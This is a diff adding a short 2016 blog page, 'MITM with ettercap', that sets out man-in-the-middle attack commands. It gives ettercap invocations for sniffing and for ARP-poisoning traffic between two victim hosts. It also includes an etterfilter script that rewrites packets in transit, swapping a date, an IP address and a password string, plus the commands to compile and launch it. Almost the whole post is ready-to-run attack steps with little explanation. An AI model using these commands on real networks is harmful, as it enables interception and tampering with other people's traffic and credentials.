@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en" class="no-js">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      MITM with ettercap &middot; M
+    
+  </title>
+
+  
+    <meta name="description" content="MITM with ettercap"/>
+    <meta name="keywords" content="">
+  
+  <meta name="author" content="Heiswayi Nrird">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@1_mod_m">
+  <meta name="twitter:creator" content="@1_mod_m">
+  
+    <meta name="twitter:title" content="MITM with ettercap">
+    <meta name="twitter:description" content="MITM with ettercap">
+  
+
+  <meta property="og:type" content="website"/>
+  
+    <meta property="og:title" content="MITM with ettercap"/>
+    <meta property="og:url" content="/Ettercap.html"/>
+    <meta property="og:description" content="MITM with ettercap"/>
+    <meta property="og:site_name" content="MITM with ettercap"/>
+  
+
+  <link rel="apple-touch-icon" sizes="57x57" href="/public/icons/apple-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="/public/icons/apple-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="/public/icons/apple-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/public/icons/apple-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="/public/icons/apple-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="/public/icons/apple-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="/public/icons/apple-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="/public/icons/apple-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/public/icons/apple-icon-180x180.png">
+  <link rel="icon" type="image/png" sizes="192x192" href="/public/icons/android-icon-192x192.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/public/icons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="96x96" href="/public/icons/favicon-96x96.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/public/icons/favicon-16x16.png">
+  <link rel="manifest" href="/public/icons/manifest.json">
+  <meta name="msapplication-TileColor" content="#f3f3f3">
+  <meta name="msapplication-TileImage" content="/public/icons/ms-icon-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  <meta name="google-site-verification" content="aSavCGGU0uSN5HEHnI7ZiMqVKxn7mfUPCGMVJvmDQ1w" />
+  <meta name="wot-verification" content="6da2597a332a1fadad8f"/>
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/public/css/normalize.css">
+  <link rel="stylesheet" href="/public/css/style.css">
+
+  <script src="/public/js/modernizr.custom.js"></script>
+  <script src="/public/js/jquery-1.11.2.min.js"></script>
+  <script src="/public/js/masonry.pkgd.min.js"></script>
+
+  <!--[if lt IE 9]>
+    <script src="http://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.2/html5shiv.min.js"></script>
+    <script src="http://cdnjs.cloudflare.com/ajax/libs/respond.js/1.1.0/respond.min.js"></script>
+    <script src="/public/js/rem.min.js"></script>
+  <![endif]-->
+</head>
+
+
+  <body>
+
+    <div class="wrap">
+      <div class="master-nav">
+        <div class="nav">
+            <ul class="top-menu">
+              <li><a href="/"><i class="fa fa-home"></i> Home</a></li>
+              <li><a href="/about.html"><i class="fa fa-info-circle"></i> About</a></li>
+              <li><a href="/notes.html"><i class="fa fa-pencil"></i> Posts</a></li>
+              <li><a class="resume" href="https://1modm.github.io/documentation/"><i class="fa fa-file-text-o"></i> Notes</a></li>
+              <li><a class="special" href="https://github.com/1modm?tab=repositories"><i class="fa fa-github-alt"></i> Repositories</a></li>
+
+            </ul>
+        </div>
+      </div>
+
+      <div class="masthead">
+        <div class="container">
+          <h2 class="masthead-title">
+            <a href="/" title="Home">M</a>
+            <small></small>
+          </h2>
+
+          <div class="footer-social-links">
+  <a href="https://www.linkedin.com/in/mmorillo" title="LinkedIn" target="_blank"><i class="fa fa-linkedin"></i></a>
+  <a href="https://twitter.com/1_mod_m" title="Twitter" target="_blank"><i class="fa fa-twitter"></i></a>
+  <a href="https://github.com/1modm" title="GitHub" target="_blank"><i class="fa fa-github-alt"></i></a>
+</div>
+
+
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <div class="post-top-meta">
+    <div class="post-date">September 21, 2016 &middot; <span class="reading-time" title="Estimated Reading Time">
+  
+  
+    1 minute read
+  
+</span>
+</div>
+    <h1 class="post-title">MITM with ettercap</h1>
+  </div>
+
+  <div class="hrline"></div>
+
+  <p><a href="https://ettercap.github.io/ettercap/">Ettercap</a> is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.</p>
+
+<h3 id="basic-sniffing">Basic Sniffing</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code># ettercap -Tzq -i eth0
+</code></pre>
+</div>
+
+<p>To sniff traffic between 2 hosts:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code># ettercap -i eth0 -Tq -M ARP:remote /victim_ip_A/ /victim_ip_B/
+</code></pre>
+</div>
+
+<p>Capture traffic on a certain port only:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code># ettercap -i eth0 -T -M arp /192.168.1.1 / /192.168.1.10-20/23
+</code></pre>
+</div>
+
+<h3 id="mitm">MITM</h3>
+
+<p>Filter example:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>if (tcp.dst == 1234 &amp;&amp; search(DECODED.data,"2016-10-03")){
+        msg("Match date...\n");
+        replace("2016-10-03","2017-10-03");
+        replace("118.186.71.134","111.222.33.444");
+        replace("PASw0rD","NOPassw");
+}
+</code></pre>
+</div>
+
+<p>Compile the filter:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code># etterfilter -o POC.ef POC.filter
+</code></pre>
+</div>
+
+<p>Launch ettercap:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code># ettercap -T -q -i eth0 -F POC.ef -M ARP
+</code></pre>
+</div>
+
+  
+</div>
+<div class="back"><a href="/notes.html"><i class="fa fa-chevron-left"></i> Back</a></div>
+
+      </div>
+    </div>
+
+	  <div class="footer">
+	<div class="hrline"></div>
+
+	<div class="copyright">Made with <span style="color:#e00"><i class="fa fa-heart"></i></span> using <a href="http://jekyllrb.com">Jekyll</a> &middot; <i class="fa fa-code"></i> on <a href="https://github.com/heiswayi/heiswayi.github.io_jekyll_source">GitHub</a> <i class="fa fa-github-alt"></i><br>&copy; 2017 </div>
+</div>
+
+<script>
+$(window).load(function() {
+	$('.grid').masonry({
+		itemSelector: '.grid-item',
+		columnWidth: '.grid-sizer',
+		gutter: 10
+	});
+});
+</script>
+
+
+	<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-xxxx', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+  </body>
+</html>
